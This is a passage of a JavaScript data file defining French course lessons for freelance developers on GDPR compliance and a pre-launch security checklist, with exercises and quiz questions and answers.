      { type: "mcq", question: "Pourquoi le rate limiting est-il important sur une API Route qui appelle OpenAI ?", options: JSON.stringify(["Pour améliorer les performances", "Pour éviter une facture excessive en cas d'abus", "Pour respecter le RGPD", "Pour améliorer le SEO"]), correctAnswer: "Pour éviter une facture excessive en cas d'abus", explanation: "Sans rate limiting, un attaquant peut envoyer des milliers de requêtes à ton endpoint, chacune générant un appel payant à l'API OpenAI. Le rate limiting limite le nombre de requêtes par utilisateur par période." },
      { type: "true_false", question: "La méthode safeParse de Zod lance une exception si les données sont invalides.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "safeParse ne lance pas d'exception. Elle retourne un objet avec success: true/false et les données validées ou les erreurs. C'est parse() (sans safe) qui lance une exception." },
    ],
  },

  // ─── LEÇON 4 : RGPD et protection des données ───
  {
    order: 4,
    module: 14,
    title: "RGPD et protection des données",
    slug: "v2-rgpd-protection-donnees",
    duration: "20 min",
    description: "Comprends les obligations légales du RGPD pour tes projets web et IA. Apprends à collecter, stocker et traiter les données personnelles en conformité avec la loi européenne.",
    content: blocks([
      { id: "4-1", type: "heading", level: 2, text: "Le RGPD : pourquoi tu ne peux pas l'ignorer" },
      { id: "4-2", type: "text", html: "<p>Le Règlement Général sur la Protection des Données (RGPD) s'applique à <strong>toute entreprise ou développeur</strong> qui traite des données de résidents européens. Peu importe la taille de ton entreprise ou le pays de ton serveur.</p><p>Les amendes peuvent atteindre <strong>20 millions d'euros ou 4% du chiffre d'affaires mondial</strong>. Même pour un freelance, une plainte à la CNIL peut entraîner des sanctions financières et une interdiction de traiter des données.</p>" },
      { id: "4-3", type: "callout", variant: "warning", html: "<strong>Attention IA :</strong> Si tu utilises des données clients pour entraîner ou fine-tuner un modèle IA, c'est un traitement de données au sens du RGPD. Tu dois avoir une base légale et informer les utilisateurs." },

      { id: "4-20", type: "heading", level: 3, text: "Le RGPD et l'IA : les zones grises" },
      { id: "4-21", type: "text", html: "<p>L'utilisation de l'IA ajoute des questions RGPD spécifiques que beaucoup de développeurs ignorent :</p><ul><li><strong>Envoi de données à OpenAI/Anthropic :</strong> Quand tu envoies des données utilisateur à une API IA, tu effectues un transfert de données vers un sous-traitant. Tu dois le mentionner dans ta politique de confidentialité et t'assurer que le fournisseur est conforme.</li><li><strong>Conservation des conversations :</strong> Si ton chatbot conserve l'historique des conversations, c'est un traitement de données personnelles. Les utilisateurs doivent pouvoir supprimer leur historique.</li><li><strong>Profilage automatisé :</strong> Si ton IA prend des décisions automatisées qui affectent les utilisateurs (scoring, recommandations qui impactent l'accès à un service), l'utilisateur a le droit de demander une intervention humaine.</li><li><strong>Données d'entraînement :</strong> Si tu fine-tunes un modèle avec des données clients, tu dois avoir une base légale explicite. Le consentement est souvent nécessaire.</li></ul>" },
      { id: "4-22", type: "callout", variant: "info", html: "<strong>Bonne nouvelle :</strong> Les API OpenAI et Anthropic ne réutilisent PAS les données envoyées via l'API pour l'entraînement (sauf si tu optes explicitement). C'est différent de ChatGPT gratuit. Vérifie les conditions de chaque fournisseur." },

      { id: "4-4", type: "separator", style: "dots" },

      { id: "4-5", type: "heading", level: 2, text: "Les 6 principes du RGPD" },
      { id: "4-6", type: "steps", steps: [
        { title: "Licéité", description: "Tu dois avoir une base légale pour traiter les données : consentement, exécution d'un contrat, intérêt légitime, obligation légale, etc." },
        { title: "Limitation des finalités", description: "Les données collectées pour un but précis ne doivent pas être réutilisées pour un autre but sans nouveau consentement." },
        { title: "Minimisation", description: "Ne collecte que les données strictement nécessaires. Pas besoin de la date de naissance pour un chatbot." },
        { title: "Exactitude", description: "Les données doivent être exactes et tenues à jour. Permets aux utilisateurs de les corriger." },
        { title: "Limitation de conservation", description: "Ne garde les données que le temps nécessaire. Définis une politique de suppression automatique." },
        { title: "Sécurité", description: "Protège les données contre les accès non autorisés, la perte et la destruction. Chiffrement, sauvegardes, RLS." },
      ]},

      { id: "4-23", type: "heading", level: 3, text: "Choisir la bonne base légale" },
      { id: "4-24", type: "text", html: "<p>Le consentement n'est pas toujours nécessaire. Voici les bases légales les plus utilisées par les freelances IA :</p>" },
      { id: "4-25", type: "comparison", headers: ["Base légale", "Quand l'utiliser", "Exemple"], rows: [
        { cells: ["Consentement", "Tracking, newsletter, cookies non essentiels", "Case à cocher : 'J'accepte de recevoir les emails marketing'"] },
        { cells: ["Exécution du contrat", "Les données nécessaires pour fournir le service", "Email et nom pour créer un compte, factures pour la comptabilité"] },
        { cells: ["Intérêt légitime", "Analytics basiques, sécurité, prévention de la fraude", "Logger les adresses IP pour détecter les attaques DDoS"] },
        { cells: ["Obligation légale", "Facturation, comptabilité, déclaration fiscale", "Conserver les factures pendant 10 ans (obligation comptable)"] },
      ]},
      { id: "4-26", type: "callout", variant: "tip", html: "<strong>En pratique :</strong> Pour un SaaS IA, tu utiliseras l'exécution du contrat pour les données de compte, le consentement pour le tracking/newsletter, et l'intérêt légitime pour la sécurité. Tu n'as PAS besoin du consentement pour stocker l'email de connexion — c'est nécessaire à l'exécution du service." },

      { id: "4-7", type: "separator", style: "line" },

      { id: "4-8", type: "heading", level: 2, text: "Les droits des utilisateurs" },
      { id: "4-9", type: "text", html: "<p>Le RGPD donne aux utilisateurs des droits que tu dois respecter :</p><ul><li><strong>Droit d'accès :</strong> L'utilisateur peut demander une copie de toutes ses données</li><li><strong>Droit de rectification :</strong> Il peut corriger ses données inexactes</li><li><strong>Droit à l'effacement :</strong> Il peut demander la suppression de ses données (droit à l'oubli)</li><li><strong>Droit à la portabilité :</strong> Il peut récupérer ses données dans un format structuré (JSON, CSV)</li><li><strong>Droit d'opposition :</strong> Il peut refuser certains traitements, notamment le profilage</li></ul>" },

      { id: "4-27", type: "heading", level: 3, text: "Implémenter le droit à l'effacement : le guide technique" },
      { id: "4-28", type: "text", html: "<p>Le droit à l'effacement est celui qui demande le plus de travail technique. Quand un utilisateur demande la suppression de son compte, tu dois supprimer :</p><ul><li><strong>Son profil utilisateur</strong> (table users)</li><li><strong>Toutes ses données applicatives</strong> (conversations, documents, résultats IA...)</li><li><strong>Ses fichiers uploadés</strong> (Supabase Storage, R2...)</li><li><strong>Ses données de session</strong> (tokens, cookies)</li></ul><p>Mais tu peux GARDER certaines données :</p><ul><li><strong>Factures et données comptables</strong> (obligation légale de conservation pendant 10 ans)</li><li><strong>Logs de sécurité anonymisés</strong> (intérêt légitime)</li></ul><p>Crée une API Route <code>/api/delete-account</code> qui orchestre la suppression dans tous tes services. Teste-la régulièrement pour vérifier qu'elle fonctionne.</p>" },

      { id: "4-10", type: "heading", level: 2, text: "Implémentation concrète dans ton app" },
      { id: "4-11", type: "text", html: "<p>Voici ce que tu dois mettre en place :</p><ul><li><strong>Bannière cookies :</strong> Demande le consentement avant de charger les scripts de tracking (Google Analytics, Hotjar...)</li><li><strong>Page de politique de confidentialité :</strong> Explique quelles données tu collectes, pourquoi, et combien de temps tu les conserves</li><li><strong>Page de paramètres :</strong> Permet à l'utilisateur de supprimer son compte et exporter ses données</li><li><strong>Registre des traitements :</strong> Documente tous les traitements de données que tu effectues</li></ul>" },
      { id: "4-12", type: "callout", variant: "tip", html: "<strong>Conseil pratique :</strong> Utilise un service comme Tarteaucitron.js ou CookieConsent pour la bannière cookies. Pour la politique de confidentialité, des générateurs comme Iubenda peuvent t'aider à démarrer." },

      { id: "4-13", type: "checklist", title: "Checklist RGPD minimale", items: [
        { id: "c1", text: "Bannière de consentement cookies fonctionnelle" },
        { id: "c2", text: "Page politique de confidentialité complète" },
        { id: "c3", text: "Fonctionnalité de suppression de compte" },
        { id: "c4", text: "Export des données utilisateur (JSON/CSV)" },
        { id: "c5", text: "Chiffrement des données sensibles en base" },
        { id: "c6", text: "Registre des traitements documenté" },
        { id: "c7", text: "Fournisseurs IA mentionnés dans la politique de confidentialité" },
        { id: "c8", text: "Durées de conservation définies pour chaque type de données" },
      ]},
    ]),
    exercise: "<h3>Exercice : Mise en conformité RGPD</h3><p>Rends ton projet conforme au RGPD :</p><ol><li>Crée une page /privacy avec ta politique de confidentialité</li><li>Implémente une bannière de consentement cookies</li><li>Ajoute un bouton 'Supprimer mon compte' dans les paramètres utilisateur</li><li>Crée une API Route /api/export-data qui retourne toutes les données de l'utilisateur en JSON</li><li>Documente tes traitements de données dans un fichier registre</li></ol>",
    quiz: [
      { type: "mcq", question: "Quelle est l'amende maximale prévue par le RGPD ?", options: JSON.stringify(["1 million d'euros", "10 millions d'euros", "20 millions d'euros ou 4% du CA mondial", "100 000 euros"]), correctAnswer: "20 millions d'euros ou 4% du CA mondial", explanation: "Le RGPD prévoit des amendes pouvant aller jusqu'à 20 millions d'euros ou 4% du chiffre d'affaires annuel mondial, le montant le plus élevé étant retenu." },
      { type: "true_false", question: "Le RGPD ne s'applique qu'aux grandes entreprises de plus de 50 employés.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "Le RGPD s'applique à toute entité qui traite des données personnelles de résidents européens, quelle que soit sa taille. Un freelance est soumis aux mêmes obligations qu'une multinationale." },
      { type: "mcq", question: "Quel droit permet à un utilisateur de récupérer ses données dans un format structuré ?", options: JSON.stringify(["Droit d'accès", "Droit à l'effacement", "Droit à la portabilité", "Droit d'opposition"]), correctAnswer: "Droit à la portabilité", explanation: "Le droit à la portabilité permet à l'utilisateur de récupérer ses données dans un format structuré, couramment utilisé et lisible par machine (JSON, CSV), pour les transférer à un autre service." },
      { type: "true_false", question: "Tu peux charger Google Analytics avant d'avoir obtenu le consentement de l'utilisateur.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "Google Analytics dépose des cookies de tracking qui nécessitent le consentement préalable de l'utilisateur selon le RGPD. Tu dois attendre le consentement avant de charger le script." },
      { type: "mcq", question: "Quel principe RGPD stipule qu'on ne doit collecter que les données strictement nécessaires ?", options: JSON.stringify(["Licéité", "Minimisation des données", "Limitation de conservation", "Exactitude"]), correctAnswer: "Minimisation des données", explanation: "Le principe de minimisation impose de ne collecter que les données adéquates, pertinentes et limitées à ce qui est nécessaire au regard des finalités du traitement." },
      { type: "mcq", question: "Utiliser des données clients pour fine-tuner un modèle IA sans les en informer est-il conforme au RGPD ?", options: JSON.stringify(["Oui, c'est un traitement automatique", "Non, c'est un nouveau traitement qui nécessite une base légale", "Oui, si les données sont anonymisées", "Non, sauf si le modèle est open source"]), correctAnswer: "Non, c'est un nouveau traitement qui nécessite une base légale", explanation: "Le fine-tuning d'un modèle IA avec des données personnelles constitue un traitement de données au sens du RGPD. Il nécessite une base légale (consentement, intérêt légitime...) et les utilisateurs doivent en être informés." },
    ],
  },

  // ─── LEÇON 5 : Checklist sécurité avant livraison client ───
  {
    order: 5,
    module: 14,
    title: "Checklist sécurité avant livraison client",
    slug: "v2-checklist-securite-livraison",
    duration: "15 min",
    description: "La checklist complète à parcourir avant chaque mise en production. Couvre l'authentification, les données, les API, le monitoring et la conformité légale.",
    content: blocks([
      { id: "5-1", type: "heading", level: 2, text: "Jamais de mise en prod sans checklist" },
      { id: "5-2", type: "text", html: "<p>Tu as codé ton app, tout marche en local, le client est pressé. La tentation est grande de déployer vite. Mais une mise en production sans vérification de sécurité, c'est comme livrer une maison sans vérifier les serrures.</p><p>Cette checklist est ton filet de sécurité. Parcours-la <strong>systématiquement</strong> avant chaque livraison.</p>" },
      { id: "5-3", type: "callout", variant: "tip", html: "<strong>Astuce pro :</strong> Copie cette checklist dans un template Notion ou un fichier CHECKLIST.md à la racine de chaque projet. Coche chaque point avant de merger la PR de mise en production." },

      { id: "5-20", type: "heading", level: 3, text: "L'histoire du freelance qui n'a pas vérifié" },
      { id: "5-21", type: "text", html: "<p>Scénario vécu : un freelance livre un site e-commerce à un client. Tout fonctionne en démo. Le client est content, le projet est facturé. Deux semaines plus tard, un utilisateur découvre qu'en modifiant l'URL, il peut voir les commandes de tous les clients. Pas de RLS, pas de vérification d'authentification sur l'API qui retourne les commandes.</p><p>Résultat : le client doit notifier la CNIL (fuite de données personnelles), les clients du site sont informés, la confiance est détruite. Le freelance doit corriger gratuitement et perd le client. Tout ça aurait été évité en 10 minutes de checklist.</p>" },

      { id: "5-4", type: "separator", style: "dots" },

      { id: "5-5", type: "heading", level: 2, text: "Authentification & Accès" },
      { id: "5-6", type: "checklist", title: "Vérifications authentification", items: [
        { id: "c1", text: "RLS activé sur toutes les tables contenant des données utilisateurs" },
        { id: "c2", text: "Policies RLS testées avec différents rôles" },
        { id: "c3", text: "Pages protégées inaccessibles sans connexion (middleware)" },
        { id: "c4", text: "Tokens JWT validés côté serveur sur chaque API Route" },
        { id: "c5", text: "Politique de mots de passe robuste (8+ caractères, complexité)" },
      ]},

      { id: "5-22", type: "heading", level: 3, text: "Test rapide de sécurité des accès" },
      { id: "5-23", type: "text", html: "<p>Avant chaque livraison, fais ce test en 5 minutes :</p><ol><li><strong>Ouvre ton app en navigation privée</strong> (pas connecté) et essaie d'accéder aux pages protégées en tapant directement l'URL. Tu devrais être redirigé vers la page de login.</li><li><strong>Connecte-toi avec un compte test A</strong> et note les URLs de tes pages de données (ex: /dashboard/invoices/123).</li><li><strong>Connecte-toi avec un compte test B</strong> dans un autre navigateur et essaie d'accéder aux URLs de A. Tu ne devrais voir aucune donnée de A.</li><li><strong>Ouvre les DevTools</strong>, copie un appel API et relance-le sans le cookie d'authentification. Tu devrais recevoir une erreur 401.</li></ol><p>Si un de ces tests échoue, tu as une faille de sécurité critique. Ne déploie pas avant de l'avoir corrigée.</p>" },

      { id: "5-7", type: "separator", style: "line" },

      { id: "5-8", type: "heading", level: 2, text: "Données & API" },
      { id: "5-9", type: "checklist", title: "Vérifications données et API", items: [
        { id: "c6", text: "Validation Zod sur toutes les API Routes" },
        { id: "c7", text: "Rate limiting sur les endpoints sensibles (IA, emails, paiement)" },
        { id: "c8", text: "Pas de clé secrète dans le code côté client" },
        { id: "c9", text: "Variables d'environnement configurées sur Vercel (Preview + Production)" },
        { id: "c10", text: "Pas de console.log avec des données sensibles en production" },
        { id: "c11", text: "CORS configuré correctement (pas de wildcard * en prod)" },
      ]},

      { id: "5-24", type: "heading", level: 3, text: "Le nettoyage pré-production" },
      { id: "5-25", type: "steps", steps: [
        { title: "Supprimer les console.log sensibles", description: "Cherche dans ton code tous les console.log qui affichent des tokens, emails, passwords ou données utilisateur. En prod, ces logs sont visibles dans les DevTools du navigateur. Utilise console.error() uniquement dans les catch blocks côté serveur." },
        { title: "Vérifier les réponses API", description: "Assure-toi que tes API Routes ne retournent pas plus de données que nécessaire. Un endpoint /api/user ne devrait pas retourner le mot de passe hashé, même s'il est hashé. Sélectionne explicitement les champs retournés." },
        { title: "Tester les erreurs gracieuses", description: "Que se passe-t-il si l'utilisateur envoie un payload vide ? Un JSON malformé ? Un fichier de 500 MB ? Ton app ne devrait jamais crasher avec une stack trace visible — elle devrait retourner un message d'erreur propre." },
        { title: "Vérifier les limites de taille", description: "Configure des limites sur les uploads de fichiers, la taille des payloads JSON, et les requêtes IA. Un utilisateur ne devrait pas pouvoir envoyer un prompt de 100 000 caractères à ton API." },
      ]},

      { id: "5-10", type: "heading", level: 2, text: "Infrastructure & Monitoring" },
      { id: "5-11", type: "checklist", title: "Vérifications infrastructure", items: [
        { id: "c12", text: "HTTPS forcé (redirection HTTP vers HTTPS)" },
        { id: "c13", text: "Headers de sécurité configurés (CSP, X-Frame-Options, HSTS)" },
        { id: "c14", text: "Vercel Analytics ou équivalent configuré pour capter les erreurs" },
        { id: "c15", text: "Sauvegardes automatiques de la base de données" },
        { id: "c16", text: "Domaine et certificat SSL vérifié" },
      ]},

      { id: "5-12", type: "heading", level: 2, text: "Conformité & Légal" },
      { id: "5-13", type: "checklist", title: "Vérifications légales", items: [
        { id: "c17", text: "Bannière de consentement cookies fonctionnelle" },
        { id: "c18", text: "Page politique de confidentialité accessible" },
        { id: "c19", text: "Mentions légales présentes" },
        { id: "c20", text: "CGU/CGV si vente en ligne" },
        { id: "c21", text: "Fonctionnalité de suppression de compte" },
      ]},

      { id: "5-26", type: "heading", level: 3, text: "La livraison client : au-delà de la sécurité" },
      { id: "5-27", type: "text", html: "<p>La sécurité est la priorité, mais une bonne livraison inclut aussi :</p><ul><li><strong>Tests cross-navigateurs :</strong> Teste au minimum sur Chrome, Safari et Firefox. Les bugs Safari sont les plus courants et les plus fourbes.</li><li><strong>Tests mobile :</strong> Vérifie le responsive design sur un vrai téléphone, pas juste les DevTools. Les interactions tactiles sont différentes.</li><li><strong>Performance :</strong> Lance un test Lighthouse. Vise un score de 90+ en Performance et Accessibility.</li><li><strong>SEO basique :</strong> Vérifie les meta tags (title, description), les balises OpenGraph (partage sur réseaux sociaux), et le favicon.</li><li><strong>Documentation :</strong> Fournis au client un document avec les accès (admin, base de données), la procédure de déploiement, et les contacts d'urgence.</li></ul>" },

      { id: "5-14", type: "callout", variant: "warning", html: "<strong>Rappel :</strong> Cette checklist est un minimum. Pour les projets sensibles (santé, finance, données mineurs), des audits de sécurité professionnels sont recommandés." },
    ]),
    exercise: "<h3>Exercice : Audit complet de ton projet</h3><p>Applique la checklist complète à ton projet actuel :</p><ol><li>Parcours chaque section et coche les points validés</li><li>Pour chaque point non validé, crée un ticket dans ton outil de gestion (Notion, GitHub Issues)</li><li>Priorise les corrections : critique (accès non autorisé), important (données exposées), mineur (headers manquants)</li><li>Corrige les points critiques immédiatement</li><li>Planifie les corrections importantes dans le prochain sprint</li></ol>",
    quiz: [
      { type: "mcq", question: "Quel est le premier élément à vérifier avant une mise en production ?", options: JSON.stringify(["Le design est pixel-perfect", "RLS est activé sur toutes les tables sensibles", "Le loading spinner est bien animé", "Les favicons sont configurées"]), correctAnswer: "RLS est activé sur toutes les tables sensibles", explanation: "La sécurité des données est la priorité absolue. Si RLS n'est pas activé, n'importe qui peut accéder à toutes les données de ta base via la clé anon publique." },
      { type: "true_false", question: "Il est acceptable d'utiliser CORS avec un wildcard (*) en production.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "Un wildcard CORS en production signifie que n'importe quel site peut envoyer des requêtes à ton API. En production, limite CORS aux domaines de confiance uniquement." },
      { type: "mcq", question: "Pourquoi faut-il supprimer les console.log sensibles avant la mise en production ?", options: JSON.stringify(["Ça ralentit l'application", "Les données loguées sont visibles dans les DevTools du navigateur", "Ça augmente la taille du bundle", "Ce n'est pas nécessaire, c'est juste esthétique"]), correctAnswer: "Les données loguées sont visibles dans les DevTools du navigateur", explanation: "Les console.log sont visibles par tout utilisateur qui ouvre les DevTools du navigateur. Si tu logues des tokens, emails ou données utilisateur, ils sont exposés publiquement." },
      { type: "true_false", question: "Les mentions légales sont obligatoires sur un site web français.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "En France, tout site web professionnel doit afficher des mentions légales incluant l'identité de l'éditeur, l'hébergeur, et les coordonnées de contact. C'est une obligation de la LCEN." },
      { type: "mcq", question: "Quelle est la bonne pratique pour gérer les variables d'environnement sur Vercel ?", options: JSON.stringify(["Mettre toutes les variables dans le code", "Utiliser les mêmes valeurs pour Preview et Production", "Configurer des valeurs différentes pour Preview, Development et Production", "Commiter le fichier .env dans Git"]), correctAnswer: "Configurer des valeurs différentes pour Preview, Development et Production", explanation: "Utiliser des valeurs différentes par environnement permet d'isoler les données. Ta preview utilise une base de test, tandis que la production utilise la vraie base. Cela évite les accidents." },
      { type: "mcq", question: "Quel header HTTP force le navigateur à utiliser HTTPS ?", options: JSON.stringify(["X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security (HSTS)", "X-Content-Type-Options"]), correctAnswer: "Strict-Transport-Security (HSTS)", explanation: "Le header HSTS (Strict-Transport-Security) indique au navigateur de toujours utiliser HTTPS pour ce domaine, même si l'utilisateur tape http://. Il empêche les attaques de downgrade." },
    ],
  },
];
